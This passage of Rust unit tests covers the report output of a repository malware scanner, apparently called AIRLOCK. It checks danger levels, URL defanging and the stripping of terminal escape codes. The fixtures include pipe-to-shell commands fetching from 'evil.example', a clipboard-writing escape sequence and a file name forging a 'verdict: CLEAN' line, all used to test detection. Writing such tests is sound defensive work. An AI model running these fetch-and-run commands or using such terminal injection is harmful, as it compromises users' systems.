        assert!(shown.contains("[DANGER] Downloads code from the internet and runs it"));
    }

    #[test]
    fn every_kind_has_a_level_and_title_and_prints_in_level_order() {
        let mut previous = Level::Note;
        for kind in ALL_KINDS {
            assert!(kind.level() >= previous, "{kind:?} is out of order");
            assert!(!kind.title().is_empty());
            previous = kind.level();
        }
    }

    #[test]
    fn a_danger_finding_raises_the_alarm_and_tells_people_not_to_run_it() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(Kind::DownloadsAndRuns, "", "curl x | sh", at(&file, 1));
        report.add(Kind::DownloadsAndRuns, "", "curl y | sh", at(&file, 2));

        let shown = plain(&report);

        assert!(shown.contains("DANGER: 2 dangerous findings in github.com/o/r"));
        assert!(shown.contains("Do not install, build, run or open this repository"));
        assert!(!shown.contains("NO DANGER FOUND"));
    }

    #[test]
    fn no_danger_never_reads_as_safe() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(Kind::NetworkCall, "", "https://a.example", at(&file, 1));

        let shown = plain(&report);

        assert!(shown.contains("NO DANGER FOUND. THIS DOES NOT MEAN THE REPOSITORY IS SAFE."));
        assert!(!shown.contains("Do not install"));
    }

    #[test]
    fn the_alarm_is_the_last_thing_in_the_report() {
        let shown = plain(&Report::new());

        assert!(
            shown
                .trim_end()
                .ends_with("run code you don't trust in an isolated environment.")
        );
    }

    #[test]
    fn the_summary_counts_findings_by_level() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(Kind::KnownMalicious, "", "a", at(&file, 1));
        report.add(Kind::NetworkCall, "", "b", at(&file, 1));
        report.add(Kind::NetworkCall, "", "c", at(&file, 1));
        report.add(Kind::DocumentationAddress, "", "d", at(&file, 1));

        let shown = plain(&report);

        assert!(shown.contains("   1  DANGER   could harm your computer"));
        assert!(shown.contains("   2  WARNING  check these"));
        assert!(shown.contains("   1  NOTE     listed so you can see them"));
    }

    #[test]
    fn the_header_describes_the_scan() {
        let shown = plain(&Report::new());

        assert!(shown.contains(" AIRLOCK  github.com/o/r"));
        assert!(shown.contains("commit   abc123"));
        assert!(shown.contains("read     214 files, 1.3 MB"));
        assert!(shown.contains("checked  12 packages against the OSV malware database"));
        assert!(!shown.contains(" path "));
    }

    #[test]
    fn says_when_only_part_of_a_repository_was_scanned() {
        let mut info = info();
        info.reference = Some(("branch", "main"));
        info.path = Some("erc20-token-dapp");

        let shown = Report::new().render(&info, &PLAIN);

        assert!(shown.contains("branch   main"));
        assert!(shown.contains("path     erc20-token-dapp"));
        assert!(shown.contains("Only this path was scanned, not the rest of the repository."));
    }

    #[test]
    fn says_one_file_rather_than_one_files() {
        let mut info = info();
        info.files = 1;

        assert!(
            Report::new()
                .render(&info, &PLAIN)
                .contains("read     1 file, 1.3 MB")
        );
    }

    #[test]
    fn says_it_read_files_in_memory_and_ran_nothing() {
        assert!(plain(&Report::new()).contains("None of its files were saved or run."));
    }

    #[test]
    fn addresses_cannot_be_clicked_by_accident() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(
            Kind::NetworkCall,
            "evil.example",
            "https://evil.example/a.b?next=https://other.example/",
            at(&file, 1),
        );
        report.add(Kind::IpAddress, "", "1.1.1.1", at(&file, 2));
        report.add(
            Kind::DownloadsAndRuns,
            "",
            "curl -s https://evil.example/x.sh | sh",
            at(&file, 3),
        );

        let shown = plain(&report);

        assert!(shown.contains("https[://]evil[.]example/a.b?next=https[://]other[.]example/"));
        assert!(shown.contains("  evil[.]example\n"));
        assert!(shown.contains("1[.]1[.]1[.]1"));
        assert!(shown.contains("curl -s https[://]evil[.]example/x.sh | sh"));
        assert!(!shown.contains("://evil"));
        assert!(!shown.contains("https://"));
    }

    #[test]
    fn ordinary_code_is_left_readable() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(
            Kind::CallWithoutAddress,
            "",
            "axios(config.url)",
            at(&file, 1),
        );
        report.add(Kind::AutoRunNetwork, "", "node install.js", at(&file, 2));

        let shown = plain(&report);

        assert!(shown.contains("axios(config.url)"));
        assert!(shown.contains("node install.js"));
    }

    #[test]
    fn hostile_text_cannot_reach_the_terminal() {
        let file = path("x\x1b[2J\nverdict: CLEAN.js");
        let mut report = Report::new();
        report.add(
            Kind::NetworkCall,
            "a\x1b]52;c;ZXZpbA==\x07.example",
            "https://a.example/\x1b[2J\n",
            at(&file, 1),
        );
        report.add(Kind::CallWithoutAddress, "", "fetch(\x1b[2J)", at(&file, 2));
        report.add_detail(Kind::NotRead, "link\x1b[2J", "not a \x1b[31mregular file");

        for palette in [&PLAIN, &COLOR] {
            let shown = strip_palette_codes(&report.render(&info(), palette));

            assert!(!shown.contains('\x1b') && !shown.contains('\x07'));
            assert!(!shown.lines().any(|line| line.starts_with("verdict")));
        }
    }

    #[test]
    fn plain_output_has_no_color_codes() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(Kind::KnownMalicious, "", "bad 1.0 (npm)", at(&file, 1));

        assert!(!plain(&report).contains('\x1b'));
    }

    #[test]
    fn color_output_has_the_same_text_as_plain_output_apart_from_the_alarm_padding() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(Kind::KnownMalicious, "", "bad 1.0 (npm)", at(&file, 1));
        report.add(
            Kind::NetworkCall,
            "h.example",
            "https://h.example",
            at(&file, 2),
        );

        let colored = strip_palette_codes(&report.render(&info(), &COLOR));

        for needle in [
            "bad 1.0 (npm)",
            "h[.]example",
            "DANGER: 1 dangerous finding",
            "a.js:2",
        ] {
            assert!(colored.contains(needle), "missing: {needle}");
        }
        assert!(colored.contains(" DANGER  Known malicious package"));
    }

    #[test]
    fn only_uses_color_where_it_will_display_properly() {
        // Output going to a file or program.
        assert!(!wants_color(false, false, Some("xterm"), false, false));
        // The NO_COLOR convention.
        assert!(!wants_color(true, true, Some("xterm"), false, false));
        // Terminals that can't show it.
        assert!(!wants_color(true, false, Some("dumb"), false, false));
        assert!(!wants_color(true, false, None, false, false));
        // Normal Linux and macOS terminals.
        assert!(wants_color(
            true,
            false,
            Some("xterm-256color"),
            false,
            false
        ));
        assert!(wants_color(true, false, Some("linux"), false, false));
        // An old Windows console, and Windows Terminal.
        assert!(!wants_color(true, false, None, true, false));
        assert!(wants_color(true, false, None, true, true));
    }

    #[test]
    fn warns_about_hosts_that_may_imitate_a_familiar_name() {
        let file = path("a.js");
        let mut report = Report::new();
        report.add(
            Kind::MentionedAddress,
            "gіthub.com",
            "https://gіthub.com/x",
            at(&file, 1),
        );

        assert!(plain(&report).contains("look-alikes"));
    }

    #[test]
    fn says_when_it_is_incomplete_instead_of_silently_dropping_items() {
        let file = path("a.js");
        let mut report = Report::with_budget(1000);
        for number in 0..100 {
            let url = format!("https://host{number}.example/x");
            report.add(Kind::MentionedAddress, "", &url, at(&file, 1));
        }

        let shown = plain(&report);

        assert!(report.not_listed > 0);
        assert!(shown.contains("This list is incomplete"));
        assert!(report.retained_bytes <= 1000);
    }

    #[test]
    fn entries_dropped_before_reaching_the_report_are_mentioned() {
        let mut report = Report::new();
        report.note_not_listed(7);

        assert!(plain(&report).contains("7 more items"));
    }

    #[test]
    fn remembers_network_calls_per_file_within_a_limit() {
        let mut report = Report::new();
        let call = Call {
            group: "h".to_string(),
            subject: "https://h/x".to_string(),
            line: Some(3),
        };
        for _ in 0..MAX_CALLS_PER_FILE + 5 {
            report.record_call("a.js", call.clone());
        }

        assert_eq!(report.calls_in("a.js").len(), MAX_CALLS_PER_FILE);
        assert_eq!(report.calls_in("a.js")[0], call);
        assert!(report.calls_in("b.js").is_empty());
    }

    #[test]
    fn knows_whether_anything_was_found() {
        let file = path("a.js");
        let mut report = Report::new();
        assert!(!report.has_findings());

        report.add(Kind::DocumentationAddress, "", "x", at(&file, 1));
        assert!(report.has_findings());
    }
}
